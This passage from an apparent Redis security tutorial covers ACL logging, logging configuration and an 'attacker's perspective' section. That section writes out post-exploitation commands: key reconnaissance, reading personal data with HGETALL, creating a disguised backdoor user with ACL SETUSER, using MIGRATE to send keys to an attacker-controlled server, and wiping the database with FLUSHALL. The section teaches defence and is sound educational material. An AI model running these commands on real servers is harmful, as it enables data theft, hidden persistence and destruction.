   12) "3.8490000000000002"
   13) "client-info"
   14) "id=4 addr=127.0.0.1:36758 fd=8 name= age=46 idle=0 flags=N db=0 sub=0
psub=0 multi=-1 qbuf=22 qbuf-free=32746 obl=0 oll=0 omem=0 events=r cmd=get user=john"
2)  1) "count"
    2) (integer) 1
    3) "reason"
    4) "command"
    5) "context"
    6) "toplevel"
    7) "object"
    8) "set"
    9) "username"
   10) "john"
   11) "age-seconds"
   12) "10.545999999999999"
   13) "client-info"
   14) "id=4 addr=127.0.0.1:36758 fd=8 name= age=39 idle=0 flags=N db=0 sub=0
psub=0 multi=-1 qbuf=34 qbuf-free=32734 obl=0 oll=0 omem=0 events=r cmd=set user=john"
```

The ACL LOG output shows the following:

1. The reason a command was blocked
- This can be seen under "reason". Reasons may be "auth", "command", and "key".
2. The object denied access.
- This may be a command, a key, or the user for whom authentication failed.
3. How long ago the failure occurred
4. The connection information for the client and user who requested the failed command.

The ACL log is especially useful when you're troubleshooting application failures. The log can also help you to identify compromised connections.

You can limit the number of log entries that are shown by appending a number to the ACL LOG. For example, here's how to request the two most recent log entries:
```
> ACL LOG 2
```

Since the ACL log is stored in memory, there are two ways to limit it: resetting the log or setting a maximum length. To clear the log, you can call the ACL LOG RESET command:
```
> ACL LOG RESET
```

To set a maximum length, you can set the acllog-max-len directive in the `redis.conf` file:
```
acllog-max-len 10
```

#### Setting up and using the Redis Log File
The Redis log file is the other important log you need to be aware of. The Redis log file contains useful information for troubleshooting errors configuration and deployment errors. If you don't configure Redis logging, troubleshooting will be *significantly* harder.

Redis has four logging levels, which you can configure directly in `redis.conf` file.

Log Levels:

1. WARNING
2. NOTICE
3. VERBOSE
4. DEBUG

```
# Specify the server verbosity level.
# This can be one of:
# debug (a lot of information, useful for development/testing)
# verbose (many rarely useful info, but not a mess like the debug level)
# notice (moderately verbose, what you want in production probably)
# warning (only very important / critical messages are logged)
# nothing (nothing is logged)
loglevel notice

# Specify the log file name. Also the empty string can be used to force
# Redis to log on the standard output. Note that if you use standard
# output for logging but daemonize, logs will be sent to /dev/null
logfile ""

# To enable logging to the system logger, just set 'syslog-enabled' to yes,
# and optionally update the other syslog parameters to suit your needs.
# syslog-enabled no

# Specify the syslog identity.
# syslog-ident redis

# Specify the syslog facility. Must be USER or between LOCAL0-LOCAL7.
# syslog-facility local0

# To disable the built in crash log, which will possibly produce cleaner core
# dumps when they are needed, uncomment the following:
#
# crash-log-enabled no
```

Redis also supports sending the log files to a remote logging server through the use of syslog.

Remote logging is important to many security professionals. These remote logging servers are frequently used to monitor security events and manage incidents. These centralized log servers perform three common functions: ensure the integrity of your log files, ensure that logs are retained for a specific period of time, and to correlate logs against other system logs to discover potential attacks on your infrastructure.

Let's set up logging on our Redis deployment. First we'll open our `redis.conf` file
```
$ sudo vi /etc/redis/redis.conf
```

The redis.conf file has an entire section dedicated to logging.

First, find the `logfile` directive in the redis.conf file. This will allow you to define the logging directory. For this example lets use `/var/log/redis/redis.log`.

If you'd like to use a remote logging server, then you'll need to uncomment the lines `syslog-enabled`, `syslog-ident` and `syslog-facility`, and ensure that `syslog-enabled` is set to `yes`.

Next, we'll restart the Redis server.

You should see the log events indicating that Redis is starting.
```
$ sudo tail -f /var/log/redis/redis.log
```

And next let's check that we are properly writing to syslog. You should see these same logs.
```
$ less /var/log/syslog | grep redis
```

Finally, you’ll need to send your logs to your remote logging server to ensure your logs will be backed up to this server. To do this, you’ll also have to modify the rsyslog configuration. This configuration varies depending on your remote logging server provider. Check with your administrator or DevOps team for details on this.


### VII. [An Attacker's Perspective](https://youtu.be/NmPv15JJm5Y)
At this point, I'm sure you understand that the majority of Redis exploits are caused by administrators exposing Redis directly to the internet and by not enabling authentication. After all, you've heard our horror stories. 

ACLs are important because they limit attack surface. But to limit attack surface, you need to understand a few post-exploitation techniques. Post-exploitation is what happens when an attacker has gained access to a system. This should get you thinking about exactly what you need to protect against. To do that, let's look at an attacker's perspective. Here's how I'd attack Redis if I were an attacker. 

First, I'd run the `SCAN` command to get a general sense of which keys exist.
If I were a less-adept attacker, I might run the `KEYS` command, which returns every key on the Redis server. The problem with this command is that it might raise alarms. The `KEYS` command blocks until it completes. For this reason, KEYS is considered a dangerous command, so don't ever run it in production yourself. 

I might also run the `MONITOR` command -- another dangerous command. The `MONITOR` command streams every command sent to Redis back to your client. This would allow me to see in real time exactly what's sent to the server. Once I had some key names, I'd run the `TYPE` command. This would show me what commands I could run against the keys that I had access to. For instance, here I have a hash. So I can use the `HGETALL` command to see what's inside. 
```
TYPE secret:users:1
HGETALL secret:users:1
```

Look at all the sensitive data. I've just found someone's personal information. I've hit the jackpot. Before leaving though, I need to add one more thing -- a backdoor user using the ACL `SETUSER` command. 
```
ACL SETUSER applicationuser on >password +@all ~* 
```

This would allow me to log back in later and continue my work. In this case, I've named the user *applicationuser* and given this user all permissions. I'll even persist it to your ACL configuration file. This ambiguous naming might get past any cursory check of the currently allowed users. So this incidentally shows why it's important to regularly review the accounts in your database. This is the approach often used by a *low-and-slow* type of attacker. These attackers are the most dangerous because they're hard to detect. 

Another type of attacker is the destructive one. As a destructive attacker, I do two things. If I thought your data was valuable, I'd use the `MIGRATE` command to send the data to my own Redis server. `MIGRATE` moves the entire key and removes it from its origin database. 
```
MIGRATE remoreredisserver.redis.cloud 7700 "" 0 5000 KEYS secret:users:1 
```

Here, I'm migrating the key secret:users:1 to my own server. I can save these details for a later targeted attack using this user's personal information. 

Now on the other hand, if the data on the system was not valuable to me, I'd just drop the database using the `FLUSHALL` command. Now if I run `KEYS`, the database no longer exists. Pretty scary, huh? That's why access controls like ACLs are so important. You can help stop the bad guys from getting in, and you can stop them from stealing data or destroying your database.

|  |  |  |
| ----------- | ----------- | ----------- |
| [SCAN command](https://redis.io/commands/scan) | [KEYS command](https://redis.io/commands/keys) | [TYPE command](https://redis.io/commands/type) |
| [MONITOR command](https://redis.io/docs/latest/commands/monitor/) | [HGETALL command](https://redis.io/commands/hgetall) | [MIGRATE command](https://redis.io/commands/migrate) |
| [FLUSHALL command](https://redis.io/commands/flushall) | [ACL commands](https://redis.io/docs/latest/commands/?name=ACL) | [ACL GENPASS](https://redis.io/docs/latest/commands/acl-genpass/) |
| [ACL USERS](https://redis.io/docs/latest/commands/acl-users/) | [ACL GETUSER](https://redis.io/docs/latest/commands/acl-getuser/) | [ACL DRYRUN](https://redis.io/docs/latest/commands/acl-dryrun/) |


### VIII. Biblipgraphy 
1. [WinShark](https://www.wireshark.org/#homeMemberLink)
2. [Npcap](https://npcap.com/)
3. [Hexdump for Windows](https://www.di-mgt.com.au/hexdump-for-windows.html#downloads)
4. [Laragon](https://laragon.org/)
5. [Redis configuration file example](https://redis.io/docs/latest/operate/oss_and_stack/management/config-file/)
6. [The Gold-Bug by  Edgar Allan Poe](https://poemuseum.org/the-gold-bug/)


### Epilogue 
```
5 3 ‡ ‡ † 3 0 5 ) ) 6 * ; 4 8 2 6 ) 4 ‡ . ) 4 ‡ ) ; 8 0 6 * ; 4 8 † 8 ¶ 6 0
) ) 8 5 ; 1 ‡ ( ; : ‡ * 8 † 8 3 ( 8 8 ) 5 * † ; 4 6 ( ; 8 8 * 9 6 * ? ; 8 ) *
‡ ( ; 4 8 5 ) ; 5 * † 2 : * ‡ ( ; 4 9 5 6 * 2 ( 5 * — 4 ) 8 ¶ 8 * ; 4 0 6
9 2 8 5 ) ; ) 6 † 8 ) 4 ‡ ‡ ; 1 ( ‡ 9 ; 4 8 0 8 1 ; 8 : 8 ‡ 1 ; 4 8 † 8 5 ;
4 ) 4 8 5 † 5 2 8 8 0 6 * 8 1 ( ‡ 9 ; 4 8 ; ( 8 8 ; 4 ( ‡ ? 3 4 ; 4 8 ) 4 ‡
; 1 6 1 ; : 1 8 8 ; ‡ ? ;
```


### EOF (2024/06/21)
